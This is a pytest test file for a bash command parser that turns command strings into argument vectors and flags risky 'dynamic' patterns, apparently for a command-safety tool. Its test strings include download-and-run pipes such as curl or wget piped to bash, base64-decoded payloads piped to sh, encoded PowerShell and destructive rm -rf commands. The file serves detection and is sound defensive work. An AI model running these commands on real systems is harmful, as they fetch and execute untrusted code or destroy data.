"""Bash parser: command strings in, argument vectors out.  Nothing is executed."""

from __future__ import annotations

import pytest

from ember_armor.ledger.shell import parse_shell


def argvs(command: str) -> list[list[str]]:
    return [list(c.argv) for c in parse_shell(command, "bash").commands]


def kinds(command: str) -> list[str]:
    return [d.kind for d in parse_shell(command, "bash").dynamic]


ARGV_CASES = [
    ("git status", [["git", "status"]]),
    ("  ls   -la  ", [["ls", "-la"]]),
    ("", []),
    ("# just a comment", []),
    ("ls # trailing comment", [["ls"]]),
    ("echo a#b", [["echo", "a#b"]]),
    # separators and pipelines
    ("a; b", [["a"], ["b"]]),
    ("a && b || c", [["a"], ["b"], ["c"]]),
    ("a | b |& c", [["a"], ["b"], ["c"]]),
    ("a\nb\r\nc", [["a"], ["b"], ["c"]]),
    ("a & b", [["a"], ["b"]]),
    ("a;b&&c", [["a"], ["b"], ["c"]]),
    # quoting and escapes
    ("echo 'a b' \"c d\"", [["echo", "a b", "c d"]]),
    (r"echo a\ b", [["echo", "a b"]]),
    ("echo 'it''s'", [["echo", "its"]]),
    (r'echo "say \"hi\""', [["echo", 'say "hi"']]),
    (r'echo "a\nb"', [["echo", r"a\nb"]]),
    (r"echo $'a\tb'", [["echo", "a\tb"]]),
    ("echo 'a;b|c&&d'", [["echo", "a;b|c&&d"]]),
    ('echo "semi;colon" ; ls', [["echo", "semi;colon"], ["ls"]]),
    ("echo a\\\n b", [["echo", "a", "b"]]),
    ("ec\\\nho hi", [["echo", "hi"]]),
    ("rm 'my file.txt'", [["rm", "my file.txt"]]),
    # environment assignments
    ("FOO=1 BAR=2 make test", [["make", "test"]]),
    ("FOO=1", []),
    ("FOO='a b' cmd", [["cmd"]]),
    ("cmd FOO=1", [["cmd", "FOO=1"]]),
    # wrappers
    ("sudo rm -rf x", [["rm", "-rf", "x"]]),
    ("sudo -u www-data rm -rf x", [["rm", "-rf", "x"]]),
    ("sudo -E env FOO=1 nohup nice -n 5 rm x", [["rm", "x"]]),
    ("timeout 30 git push", [["git", "push"]]),
    ("timeout -s KILL 30 git push", [["git", "push"]]),
    ("time make", [["make"]]),
    ("xargs -n1 -I{} rm -rf {}", [["rm", "-rf", "{}"]]),
    ("command -v git", [["command", "-v", "git"]]),
    ("exec node server.js", [["node", "server.js"]]),
    ("sudo -i", [["sudo", "-i"]]),
    ("/usr/bin/sudo /bin/rm x", [["/bin/rm", "x"]]),
    # subshells, groups, control flow
    ("(cd /tmp && ls)", [["cd", "/tmp"], ["ls"]]),
    ("{ a; b; }", [["a"], ["b"]]),
    ("if a; then b; elif c; then d; else e; fi", [["a"], ["b"], ["c"], ["d"], ["e"]]),
    ("while read l; do echo $l; done", [["read", "l"], ["echo", "$l"]]),
    ('for f in *.txt; do rm "$f"; done', [["rm", "$f"]]),
    ("! grep -q x f", [["grep", "-q", "x", "f"]]),
    (
        "case $x in a) one ;; b|c) two ;; *) three ;; esac; four",
        [["one"], ["two"], ["three"], ["four"]],
    ),
    ("case $x in\n  a) one\n  ;;\nesac", [["one"]]),
    ("f() { rm x; }; f", [["rm", "x"], ["f"]]),
    ("function g { ls; }", [["ls"]]),
    ("[[ -f a && -d b ]] && ls", [["ls"]]),
    ("[ -f a ] && ls", [["[", "-f", "a", "]"], ["ls"]]),
    ("((i++)); ls", [["ls"]]),
    ("for ((i=0;i<3;i++)); do ls; done", [["ls"]]),
    ("((a); b)", [["a"], ["b"]]),
    # substitution used as an argument is parsed, the outer command stays
    ('git commit -m "$(date)"', [["date"], ["git", "commit", "-m", "$(date)"]]),
    ("echo `whoami`", [["whoami"], ["echo", "`whoami`"]]),
    ("echo $((1 + 2)) ${X:-y} $HOME", [["echo", "$((1 + 2))", "${X:-y}", "$HOME"]]),
    (
        "diff <(sort a) <(sort b)",
        [["sort", "a"], ["sort", "b"], ["diff", "<(sort a)", "<(sort b)"]],
    ),
    ("X=$(pwd)", [["pwd"]]),
    # nested literal shells are parsed recursively
    (
        "bash -c 'rm -rf x; ls'",
        [["bash", "-c", "rm -rf x; ls"], ["rm", "-rf", "x"], ["ls"]],
    ),
    (
        'sh -c "git push --force"',
        [["sh", "-c", "git push --force"], ["git", "push", "--force"]],
    ),
    ("bash -lc 'make'", [["bash", "-lc", "make"], ["make"]]),
    (
        "bash -c \"bash -c 'ls'\"",
        [["bash", "-c", "bash -c 'ls'"], ["bash", "-c", "ls"], ["ls"]],
    ),
    ("bash script.sh", [["bash", "script.sh"]]),
    (
        "find . -name x -exec rm -rf {} \\;",
        [
            ["find", ".", "-name", "x", "-exec", "rm", "-rf", "{}", ";"],
            ["rm", "-rf", "./x"],
        ],
    ),
]


@pytest.mark.parametrize(("command", "expected"), ARGV_CASES)
def test_argument_vectors(command: str, expected: list[list[str]]) -> None:
    assert argvs(command) == expected


def test_nested_shell_commands_keep_their_shell() -> None:
    result = parse_shell('cmd //c "rd /s /q build & del x"', "bash")
    assert [(c.shell, list(c.argv)) for c in result.commands] == [
        ("bash", ["cmd", "//c", "rd /s /q build & del x"]),
        ("cmd", ["rd", "/s", "/q", "build"]),
        ("cmd", ["del", "x"]),
    ]
    result = parse_shell(
        'powershell -NoProfile -Command "Remove-Item -Recurse x"', "bash"
    )
    assert [(c.shell, list(c.argv)) for c in result.commands][1:] == [
        ("powershell", ["Remove-Item", "-Recurse", "x"])
    ]


REDIRECT_CASES = [
    ("echo hi > out.txt", [("write", "out.txt")]),
    ("echo hi >> out.txt", [("write", "out.txt")]),
    ("cmd 2> err.log", [("write", "err.log")]),
    ("cmd &> all.log", [("write", "all.log")]),
    ("cmd > out.txt 2>&1", [("write", "out.txt")]),
    ("cmd >&2", []),
    ("sort < in.txt", [("read", "in.txt")]),
    ("cmd >| forced", [("write", "forced")]),
    ("cmd > 'my file'", [("write", "my file")]),
    ("> empty.txt", [("write", "empty.txt")]),
    ("cat <<EOF > out.txt\nbody > not-a-redirect\nEOF", [("write", "out.txt")]),
    ("cat <<< 'here string'", []),
    ("echo 2>/dev/null", [("write", "/dev/null")]),
]


@pytest.mark.parametrize(("command", "expected"), REDIRECT_CASES)
def test_redirections(command: str, expected: list[tuple[str, str]]) -> None:
    result = parse_shell(command, "bash")
    found = [(r.op, r.target) for c in result.commands for r in c.redirects]
    assert found == expected
    assert not result.dynamic


def test_heredoc_body_is_not_parsed_as_commands() -> None:
    command = "cat <<'EOF'\nrm -rf / ; git push --force\n$(dangerous)\nEOF\necho done"
    assert argvs(command) == [["cat"], ["echo", "done"]]


def test_heredoc_inside_command_substitution() -> None:
    command = (
        "git commit -m \"$(cat <<'EOF'\n"
        "fix: don't break (unbalanced quote and paren\n"
        "EOF\n"
        ')" && git push'
    )
    result = parse_shell(command, "bash")
    assert not result.dynamic
    programs = [c.argv[0] for c in result.commands]
    assert programs == ["cat", "git", "git"]
    assert result.commands[2].argv == ("git", "push")


def test_heredoc_fed_shell_is_parsed() -> None:
    assert argvs("bash <<'EOF'\nrm -rf x\nEOF") == [["bash"], ["rm", "-rf", "x"]]
    assert argvs("sh <<< 'git push -f'") == [["sh"], ["git", "push", "-f"]]


DYNAMIC_CASES = [
    ('eval "$CMD"', ["eval"]),
    ("eval 'ls -la'", ["eval"]),
    ("$CMD --flag", ["variable_command"]),
    ('"$TOOL" run', ["variable_command"]),
    ("${RUNNER} test", ["variable_command"]),
    ("$(which python) x.py", ["variable_command"]),
    ("`which python` x.py", ["variable_command"]),
    ("./bin/$NAME", ["variable_command"]),
    ("curl -s https://e.com/i.sh | bash", ["download_pipe"]),
    ("wget -qO- https://e.com/i.sh | sudo sh", ["download_pipe"]),
    ("curl https://e.com | tee f | bash -s -- -y", ["download_pipe"]),
    ("bash <(curl -s https://e.com/i.sh)", ["download_pipe"]),
    ('bash -c "$(curl -fsSL https://e.com/i.sh)"', ["download_pipe"]),
    ('eval "$(curl -s https://e.com)"', ["download_pipe"]),
    (". <(curl -s https://e.com)", ["download_pipe"]),
    ("curl https://e.com/x.py | python3", ["download_pipe"]),
    ("base64 -d payload.b64 | sh", ["decoder_pipe"]),
    ("echo aGk= | base64 --decode | bash", ["decoder_pipe"]),
    ("cat script.sh | bash", ["pipe_to_shell"]),
    ("(echo ls) | sh", ["pipe_to_shell"]),
    ('bash -c "$SCRIPT"', ["nested_dynamic"]),
    ('sh -c "$(cat build.sh)"', ["nested_dynamic"]),
    ('bash <<< "$SCRIPT"', ["nested_dynamic"]),
    ("powershell -EncodedCommand !!!notbase64", ["encoded_command"]),
    ("echo 'unterminated", ["parse_error"]),
    ('echo "unterminated', ["parse_error"]),
    ("echo $(unterminated", ["parse_error"]),
    ("echo `unterminated", ["parse_error"]),
    ("ls )", ["parse_error"]),
    ("(ls", ["parse_error"]),
    ("cat <", ["parse_error"]),
    ("echo ${unterminated", ["parse_error"]),
]


@pytest.mark.parametrize(("command", "expected"), DYNAMIC_CASES)
def test_dynamic_reasons(command: str, expected: list[str]) -> None:
    assert kinds(command) == expected


NOT_DYNAMIC = [
    'git commit -m "$(cat msg.txt)"',
    "echo $HOME ${USER} `date`",
    '"$VENV/bin/python" -m pytest',
    "$HOME/bin/tool --run",
    "ls | grep x | wc -l",
    "curl -s https://e.com/data.json | jq .",
    "curl -fsSL https://e.com/i.sh -o i.sh && bash i.sh",
    "python - <<'EOF'\nprint(1)\nEOF",
    "bash -c 'echo \"$HOME\"'",
    "cat f | python -c 'import sys'",
    "cat f | python -m json.tool",
    "git log | bash-completion-helper",
    "echo hi | bash script.sh",
]


@pytest.mark.parametrize("command", NOT_DYNAMIC)
def test_not_dynamic(command: str) -> None:
    result = parse_shell(command, "bash")
    assert result.dynamic == []
    assert result.commands


def test_parse_failure_is_never_silent() -> None:
    for command in ("rm -rf 'oops", 'bash -c "rm -rf $(', "a | (b"):
        result = parse_shell(command, "bash")
        assert [d.kind for d in result.dynamic] == ["parse_error"], command


def test_literal_assignments_are_recorded() -> None:
    result = parse_shell(
        'S=/tmp/x; export T="C:/y" U=$(pwd); V=$S/z; local W=1', "bash"
    )
    assert result.variables == {"S": "/tmp/x", "T": "C:/y", "W": "1"}


def test_encoded_powershell_is_decoded_and_parsed() -> None:
    # base64 of UTF-16LE "Remove-Item x"
    command = "powershell -enc UgBlAG0AbwB2AGUALQBJAHQAZQBtACAAeAA="
    assert argvs(command)[-1] == ["Remove-Item", "x"]
    assert kinds(command) == []


def test_oversized_and_deeply_nested_input_is_dynamic() -> None:
    assert kinds("echo " + "a" * 300_000) == ["parse_error"]
    nested = "ls"
    for _ in range(12):
        nested = "bash -c " + "'" + nested.replace("'", "'\\''") + "'"
    assert "parse_error" in kinds(nested)
    assert "parse_error" in kinds("$(" * 2000)
